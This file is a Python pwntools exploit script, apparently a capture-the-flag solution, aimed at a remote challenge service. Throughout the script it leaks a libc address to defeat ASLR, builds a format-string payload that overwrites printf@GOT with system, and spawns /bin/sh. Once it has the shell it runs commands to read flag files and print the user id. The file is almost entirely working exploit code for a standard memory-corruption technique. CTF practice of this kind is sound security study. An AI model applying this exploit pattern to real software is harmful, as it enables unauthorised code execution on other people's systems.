from pwn import *
import sys, re, subprocess
context.log_level='error'; context.arch='amd64'

REMOTE = 'remote' in sys.argv
LIBC = './libc.so.6' if REMOTE else '/usr/lib/libc.so.6'

libc = ELF(LIBC, checksec=False)
# offset of the insn after `call rax` in __libc_start_call_main (= main's return address)
RET_OFF = 0x29ca8   # verified in the provided Debian glibc 2.41
PRINTF_GOT = 0x403390
BUF1_IDX   = 24          # buf1 (rbp-0x90) == %24$

def fmt_two_shorts(writes, base_idx):
    """writes: list of (addr, 16-bit value). Payload = fmt | pad | pointers."""
    for pad in range(0, 64):
        order = sorted(range(len(writes)), key=lambda k: writes[k][1])
        body, count = b'', 0
        for slot, k in enumerate(order):
            v = writes[k][1]
            tgt = v if v > count else v + 0x10000
            body += b'%%%dc%%%d$hn' % (tgt - count, base_idx + (len(writes)*0) + 0)  # placeholder
            count = tgt
        # rebuild with real indices now that ptr block offset is known
        ptr_off = len(body) + pad
        if ptr_off % 8: continue
        body, count = b'', 0
        for k in order:
            v = writes[k][1]
            tgt = v if v > count else v + 0x10000
            body += b'%%%dc%%%d$hn' % (tgt - count, base_idx + ptr_off//8 + k)
            count = tgt
        if len(body) + pad != ptr_off: continue
        payload = body + b'.'*pad + b''.join(p64(a) for a,_ in writes)
        return payload
    raise ValueError('could not align payload')

tgt = remote('chal.secso.cc', 4002) if REMOTE else process('./chal')
if not REMOTE:   # local libc differs -> derive the same offset from /proc/pid/maps
    maps = open('/proc/%d/maps' % tgt.pid).read()
    LOCAL_BASE = min(int(l.split('-')[0], 16) for l in maps.splitlines() if 'libc.so.6' in l)

# 1) arbitrary stack read: index 2 -> [rbp+8] -> main's return address in libc
tgt.sendlineafter(b'index: ', b'2')
leak = int(tgt.recvline().split(b'0x')[1].strip(), 16)
if not REMOTE:
    RET_OFF = leak - LOCAL_BASE
libc.address = leak - RET_OFF
log.warning('leak      %#x  (ret site off %#x)', leak, RET_OFF)
log.warning('libc base %#x', libc.address)
assert libc.address & 0xfff == 0, 'bad libc base'
system = libc.sym['system']
log.warning('system    %#x', system)

# 2) point printf@GOT at system (low 4 bytes; upper 2 bytes already match)
payload = fmt_two_shorts([(PRINTF_GOT, system & 0xffff),
                          (PRINTF_GOT + 2, (system >> 16) & 0xffff)], BUF1_IDX)
assert len(payload) <= 127, len(payload)
log.warning('fmt payload (%d bytes): %s', len(payload), payload[:40])

tgt.sendlineafter(b'echoed: ', payload)
# 3) second printf(buf2) becomes system("/bin/sh")
tgt.sendlineafter(b'echoed: ', b'/bin/sh')

tgt.recvuntil(b'Echoed output:', timeout=10)
sleep(2)
tgt.clean(1)
tgt.sendline(b'echo PWNED; cat /flag /flag.txt 2>/dev/null; id')
print(tgt.recvrepeat(4).decode(errors='replace')[-500:])
